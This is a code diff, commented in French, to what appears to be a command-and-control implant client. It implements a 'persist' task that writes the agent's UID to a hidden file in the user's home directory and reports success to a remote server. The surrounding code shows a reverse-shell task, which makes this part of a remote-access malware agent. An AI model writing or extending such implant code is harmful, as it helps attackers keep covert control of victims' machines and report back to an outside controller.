@@ -5,6 +5,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
+#include <pwd.h>
 #include "base64.h"
 #include "client.h"
 #include "tasks.h"
@@ -147,7 +148,40 @@ void task_revshell() {
 
 void task_persist() {
     printf("Exécution de la tâche persist\n");
-    // Implémentation à faire
+    
+    // Obtenir le nom d'utilisateur actuel via getpwuid
+    struct passwd *pw = getpwuid(getuid());
+    const char *username = (pw && pw->pw_name) ? pw->pw_name : "inconnu";
+    
+    // Construire le chemin vers /home/$user/.uid
+    char uid_path[256];
+    snprintf(uid_path, sizeof(uid_path), "/home/%s/.uid", username);
+    printf("Création du fichier de persistance: %s\n", uid_path);
+    
+    // Créer le fichier .uid dans /home/$user
+    FILE *fp = fopen(uid_path, "w");
+    if (fp == NULL) {
+        printf("Erreur: Impossible de créer le fichier de persistance %s\n", uid_path);
+        perror("Erreur");
+        return;
+    }
+    
+    // Écrire l'UID actuel dans le fichier
+    fprintf(fp, "%s", uid);
+    fclose(fp);
+    
+    printf("Persistance configurée : UID %s sauvegardé dans %s\n", uid, uid_path);
+    
+    // Envoyer un message de succès au serveur
+    char message[256];
+    char *encoded_result = encode("Persistance configurée avec succès");
+    if (encoded_result != NULL) {
+        snprintf(message, sizeof(message), "RESULT,%s,persist,%s", uid, encoded_result);
+        char *response = send_server_message(message, server_ip, server_port);
+        if (response != NULL) free(response);
+        free(encoded_result);
+    }
+    
     return;
 }
 
